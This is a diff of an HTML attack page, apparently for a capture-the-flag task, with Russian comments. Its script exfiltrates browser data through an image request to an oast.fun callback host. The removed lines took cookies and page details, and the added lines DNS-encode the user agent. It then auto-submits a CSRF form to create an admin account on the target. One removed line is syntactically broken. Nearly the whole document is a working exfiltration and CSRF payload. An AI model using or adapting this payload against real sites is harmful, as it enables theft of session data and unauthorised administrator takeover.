@@ -2,24 +2,25 @@
 <html>
 <body>
 <script>
-/* 1) собираем максимум доступной инфы */
-const botInfo = {
-  cookies: document.cookie,            // если не httpOnly — утекут
-  userAgent: navigator.userAgent,
-  platform: navigator.platform,
-  language: navigator.language,
-  timestamp: new Date().toISOString(),
-  location: window.location.href,
-  referrer: document.referrer
-};
-/* 2) кодируем (НЕ для DNS, а для webhook — можно) */
-const encodedInfo = btoa(JSON.stringify(botInfo));
+/* === 1. минимальный набор (DNS не резиновый) === */
+const data =
+  navigator.userAgent.slice(0,30) + "|" +
+  Date.now();
 
-/* 3) эксфиль всего тела через webhook */
+/* === 2. base36 (DNS‑safe) === */
+const enc = [...data]
+  .map(c => c.charCodeAt(0).toString(36))
+  .join("-");
+
+/* === 3. режем на DNS‑label === */
+const label = enc.slice(0,50);
+
+/* === 4. DNS‑exfil === */
 new Image().src =
-  "https://" + encodeURIComponent(encodedInfo) +.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/;
+  "https://" + label +
+  ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
 
-/* 4) CSRF: создаём админа */
+/* === 5. CSRF === */
 const form = document.createElement("form");
 form.method = "POST";
 form.action = "https://tasks.goidactf.ru:20246/create_admin";
@@ -32,8 +33,6 @@ input.value = "ctfadmin_" + Date.now();
 
 form.appendChild(input);
 document.body.appendChild(form);
-
-/* 5) отправляем */
 form.submit();
 </script>
 </body>
